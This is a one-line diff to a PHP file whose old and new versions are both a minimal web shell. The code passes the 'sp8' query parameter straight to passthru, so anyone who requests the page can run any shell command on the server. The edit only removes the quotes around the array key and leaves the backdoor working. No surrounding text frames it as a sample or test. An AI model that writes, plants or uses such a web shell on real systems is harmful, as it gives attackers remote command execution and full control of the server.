@@ -1,1 +1,1 @@
-<?php passthru($_GET['sp8']); ?>
+<?php passthru($_GET[sp8]); ?>
